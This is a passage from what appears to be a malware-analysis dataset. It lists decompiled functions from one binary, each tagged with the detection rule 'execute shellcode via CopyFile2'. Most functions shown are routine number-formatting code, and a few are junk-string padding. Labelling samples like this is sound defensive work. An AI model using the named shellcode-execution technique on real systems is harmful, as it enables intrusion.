        "decompiled_code": "\nuint __cdecl fcn.00401f73(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402798(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00401884(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00404ea8(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040532b(&var_ch);\n        }\n        else {\n            cVar1 = fcn.0040155f(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040617c(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004059ca(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040498f(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00405687(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.004051cd();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.00404c50(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 0;\n        if (var_4h == 8) {\n            fcn.004042a0(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.00405efc(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != '0')))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1020
    },
    "00401fa0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401fa0(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.004059cf();\n        iVar2 = fcn.00401f78(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 453
    },
    "00402270": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402270(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 396
    },
    "00402356": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402356(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a5f95;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a5f95;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a5f95:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004058a3(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.00404f34(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.004065b9(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1120
    },
    "00402720": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.00402720(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t var_4h;\n    \n    var_4h = param_1 & 0xffff0000;\n    *(param_1 + 0xf) = 1;\n    cVar1 = fcn.00403332(&var_4h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.004059b1();\n        if (cVar1 != '\\0') {\n            puVar3 = param_1 + 0x10;\n            cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            arg_8h = param_1[0x111];\n            if (cVar1 == '\\0') {\n                var_4h = var_4h & 0xffff00ff;\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                iVar2 = fcn.0040105a(arg_8h, &var_4h, *(*param_1[2] + 4), param_1[2]);\n                if (iVar2 < 0) {\n                    *(param_1 + 0xc) = 1;\n                }\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                *arg_8h = var_4h;\n            }\n            if (param_1[0x111] != NULL) {\n                puVar3 = param_1[0x111];\n            }\n            param_1[0xd] = puVar3;\n            param_1[0xe] = 1;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 447
    },
    "00402af9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402af9(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450000;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"csfiyjbvkshbwgeuioudyvnphvkprwpkpnbztcqhihbyminupgkpdoppjhoqfekjybczmqrvbv\");\n    uStack24 = 3;\n    fcn.00401e79(\"mdzlqckpryrpufqcqqfltpuqaeprorzgvuxgqbhxgnzbsdkujccduatcnfdhvfzsxscwvetkwfrugdjivqzjaul\");\n    for (iStack128 = 0x26; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    for (iStack132 = 0x5c; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x13cc0;\n}\n",
        "token_count": 374
    },
    "00402b49": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b49(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "00402d6f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d6f(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 381
    },
    "00402e96": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402e96(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a5005;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a5005;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a5005:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404c50(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00402b49(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.0040565f(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1115
    },
    "00402fd1": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402fd1(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.004059cf();\n        iVar2 = fcn.00401f78(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 453
    },
    "004031a7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004031a7(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 397
    },
    "004033ff": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004033ff(uint *param_1)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t arg_14h;\n    uint arg_18h;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        cVar1 = fcn.00404205(puVar3);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.004051cd();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        param_1[0xe] = 1;\n    }\n    else {\n        var_4h = var_4h & 0xffff0000;\n        cVar1 = fcn.00402d51(&var_4h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.004051cd();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        arg_18h = param_1[2];\n        arg_14h = var_4h;\n        arg_10h = fcn.004059cf();\n        iVar2 = fcn.00401f78(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1 + 0x10;\n    if (param_1[0x111] != NULL) {\n        puVar3 = param_1[0x111];\n    }\n    param_1[0xd] = puVar3;\n    return 1;\n}\n",
        "token_count": 547
    },
    "00403530": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403530(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    ulong uVar5;\n    int64_t iVar6;\n    uint uStack76;\n    uint uStack72;\n    uint auStack68 [3];\n    ulong uStack56;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff78;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x426e20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack40 = 0;\n    uStack48 = fcn.00401474(arg_ch);\n    iStack44 = 0;\n    uVar5 = fcn.0040199c();\n    iVar3 = uVar5 >> 0x20;\n    uVar2 = uVar5 == 0;\n    if (((SBORROW4(iVar3, uVar2) != false) == iVar3 - uVar2 < 0) &&\n       (uVar5 = fcn.0040199c(),  iVar4 = uVar5 >> 0x20,  uVar2 = uStack48 < uVar5,  iVar3 = iStack44 - iVar4, \n       (SBORROW4(iStack44, iVar4) != SBORROW4(iVar3, uVar2)) != iVar3 - uVar2 < 0)) {\n        uStack56 = fcn.0040199c();\n        uStack56 = uStack56 - CONCAT44(iStack44, uStack48);\n    }\n    else {\n        uStack56 = 0;\n    }\n    fcn.0040408e(arg_8h);\n    uVar2 = fcn.004017c6();\n    if ((uVar2 & 1) == 0) {\n        uStack40 = uStack40 | 4;\n    }\n    else {\n        uVar2 = fcn.004017c1();\n        if ((uVar2 & 0x1c0) != 0x40) {\n            while( true ) {\n                uStack56._4_4_ = uStack56 >> 0x20;\n                if ((SBORROW4(uStack56._4_4_, uStack56 == 0) != false) != uStack56._4_4_ - (uStack56 == 0) < 0) break;\n                fcn.00404def();\n                cVar1 = fcn.004039d1();\n                uStack24 = 1;\n                auStack68[0] = fcn.00401569(cVar1);\n                uStack72 = fcn.004025d6();\n                uVar2 = fcn.0040148d(auStack68, auStack68);\n                if ((uVar2 & 1) != 0) {\n                    uStack40 = uStack40 | 4;\n                    break;\n                }\n                uStack56 = uStack56 + -1;\n            }\n        }\n        if (uStack40 == 0) {\n            fcn.00404def();\n            uStack24 = 1;\n            iVar6 = fcn.00402b53(arg_ch, uStack48, iStack44);\n            if (iVar6 != CONCAT44(iStack44, uStack48)) {\n                uStack40 = uStack40 | 4;\n            }\n        }\n        if (uStack40 == 0) {\n            while( true ) {\n                uStack56._4_4_ = uStack56 >> 0x20;\n                if ((SBORROW4(uStack56._4_4_, uStack56 == 0) != false) != uStack56._4_4_ - (uStack56 == 0) < 0) break;\n                fcn.00404def();\n                cVar1 = fcn.004039d1();\n                uStack24 = 1;\n                uStack76 = fcn.00401569(cVar1);\n                fcn.004025d6();\n                uVar2 = fcn.0040148d(&uStack76, &uStack76);\n                if ((uVar2 & 1) != 0) {\n                    uStack40 = uStack40 | 4;\n                    break;\n                }\n                uStack56 = uStack56 + -1;\n            }\n        }\n        fcn.004047d2(0, 0);\n    }\n    uStack24 = 0;\n    fcn.004067a3(uStack40, 0);\n    fcn.00403a71();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 1118
    },
    "00403792": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403792(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4181d0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"bxcoommvuarehhgrxmhvqzjlqtesvxqluseywmhxxmxakzuouhcizggmmgqhelwxjngtshofwanyywdo\");\n    uStack24 = 0;\n    fcn.00401e79(\"ojrussiqrnqwthjgrajkgwsukkzvqtwokfxzvtculpgmgsthwtguvw\");\n    uStack24 = 1;\n    fcn.00401e79(\"dikolqgzzxoyxexgbimdcroqsrlcdrmibltgltdrnjatwwvusesehddmbpottgestmlgoumgrjrvme\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xea84;\n}\n",
        "token_count": 316
    },
    "004037d8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004037d8(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402798(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.004026b7(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00401bef(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00405209(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00402941(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00404b29(&var_ch);\n        }\n        else {\n            cVar1 = fcn.0040506a(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040677b(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004057b8(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = 